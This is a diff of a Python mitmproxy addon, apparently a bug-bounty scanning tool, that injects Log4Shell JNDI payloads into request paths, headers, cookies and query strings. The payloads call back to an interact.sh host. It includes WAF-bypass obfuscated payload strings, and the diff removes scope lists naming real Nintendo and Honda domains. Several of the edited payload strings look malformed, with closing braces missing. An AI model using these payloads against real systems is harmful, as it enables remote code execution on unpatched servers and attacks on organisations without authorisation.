@@ -9,21 +9,17 @@ import hashlib
 
 from query_logger import Query
 
-callback_host = "38q0d33787r245fem870uqk91282451ep.interact.sh"
-waf_bypass_payloads = ["${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://{{callback_host}}/{{random}}}",
-                       "${${::-j}ndi:rmi://{{callback_host}}/{{random}}}",
+callback_host = "qop8xb08080m4m9dop2h5s6431f584plu.interact.sh" #replace host
+waf_bypass_payloads = ["${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://%s.%s",
+                       "${${::-j}ndi:rmi://%s.%s",
                        "${jndi:rmi://{{callback_host}}}",
-                       "${${lower:jndi}:${lower:rmi}://{{callback_host}}/{{random}}}",
-                       "${${lower:${lower:jndi}}:${lower:rmi}://{{callback_host}}/{{random}}}",
-                       "${${lower:j}${lower:n}${lower:d}i:${lower:rmi}://{{callback_host}}/{{random}}}",
-                       "${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:r}m${lower:i}}://{{callback_host}}/{{random}}}",
+                       "${${lower:jndi}:${lower:rmi}://%s.%s",
+                       "${${lower:${lower:jndi}}:${lower:rmi}://%s.%s",
+                       "${${lower:j}${lower:n}${lower:d}i:${lower:rmi}://%s.%s",
+                       "${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:r}m${lower:i}}://%s.%s",
                        "${jndi:dns://{{callback_host}}}"]
-#scope = ["nintendo.de", "cstech.nintendo.com", "play.nintendo.com", "nintendo-europe-media.com", "searching.nintendo-europe.com", "nesc.nintendo.com", "store.nintendo.com", "en-americas-support.nintendo.com", "nintendo.com", "library-dev.accountportal.nintendo.net", "library-dev.id.nintendo.net", "store.nintendo.com.au", "nintendo.com.au", "nintendocomau-stage.corewebdna.com", "nshopnintendocomau-stage.corewebdna.com", "shopmembersnintendocomau-stage.corewebdna.com", "adfs.noa.nintendo.com", "joyconrepair.nintendo.com", "nintendo.comserve-nl.com",
-#         "nintendo.lu", "nintendo.be", "nintendo.nl	", "nintendo-europe.com	", "prn-wfx.nintendo.eu", "noe-wfx.nintendo.eu", "rds2.nintendo.eu", "nintendo-europe-sales.com", "nintendo-europe-media.com", "download.nintendo.es", "store.nintendo.com.br", "store.nintendo.co", "parentalcontrols.nintendo.com	", "noa3dns-w.nintendo.com", "noa01airwtch02.noa.nintendo.com	", "nftp.nintendo.com	", "Mynintendostore.nintendo.de", "gtm-west.nintendo.com", "gate-secure.nintendo.com	", "gate-prime.nintendo.com	", "dns2.nintendo.com	", "dns1.nintendo.com", "ammobile.nintendo.com"]
-#out_of_scope = ["vpn1.nintendo.com", "vpn1.nintendo.com", "vpn2.nintendo.com",
-#                "vpn3.nintendo.com", "vpn5.nintendo.com", "vpn6.nintendo.com"]
-scope = ["honda.co.jp", "honda.com"]
-out_of_scope = []
+scope = [""]#replace scope
+out_of_scope = [""]#replace oos
 
 class Log4j4all:
     def request(self, flow: http.HTTPFlow):
@@ -63,7 +59,7 @@ class Log4j4all:
     def path_test(self, flow, path, host):
         rndind = ''.join(random.choice(
             '0123456789abcdefghijklmnopqrstuvwxyz') for i in range(6))
-        payload = '${jndi:ldap://%s.%s/}' % (rndind, callback_host)
+        payload = '${${lower:j}${lower:n}${lower:d}i:${lower:rmi}://%s.%s}' % (rndind, callback_host)
         if flow.request.path.endswith("/"):
             flow.request.path = flow.request.path+payload
         with open("log4j.log", 'a') as file:
@@ -75,7 +71,7 @@ class Log4j4all:
     def header_test(self, flow, path, host, key):
         rndind = ''.join(random.choice(
             '0123456789abcdefghijklmnopqrstuvwxyz') for i in range(6))
-        payload = '${jndi:ldap://%s.%s/}' % (rndind, callback_host)
+        payload = '${${lower:j}${lower:n}${lower:d}i:${lower:rmi}://%s.%s' % (rndind, callback_host)
         flow.request.headers[key] = payload
         with open("log4j.log", 'a') as file:
             file.write("Host: "+host+" Path: "+path +
@@ -86,7 +82,7 @@ class Log4j4all:
     def cookie_test(self, flow, path, host, key):
         rndind = ''.join(random.choice(
             '0123456789abcdefghijklmnopqrstuvwxyz') for i in range(6))
-        payload = '${jndi:ldap://%s.%s/}' % (rndind, callback_host)
+        payload = '${${lower:j}${lower:n}${lower:d}i:${lower:rmi}://%s.%s' % (rndind, callback_host)
         flow.request.cookies[key] = payload
         with open("log4j.log", 'a') as file:
             file.write("Host: "+host+" Path: "+path +
@@ -97,7 +93,7 @@ class Log4j4all:
     def query_test(self, flow, path, host, key):
         rndind = ''.join(random.choice(
             '0123456789abcdefghijklmnopqrstuvwxyz') for i in range(6))
-        payload = '${jndi:ldap://%s.%s/}' % (rndind, callback_host)
+        payload = '${${lower:j}${lower:n}${lower:d}i:${lower:rmi}://%s.%s' % (rndind, callback_host)
         flow.request.query[key] = payload
         with open("log4j.log", 'a') as file:
             file.write("Host: "+host+" Path: "+path +
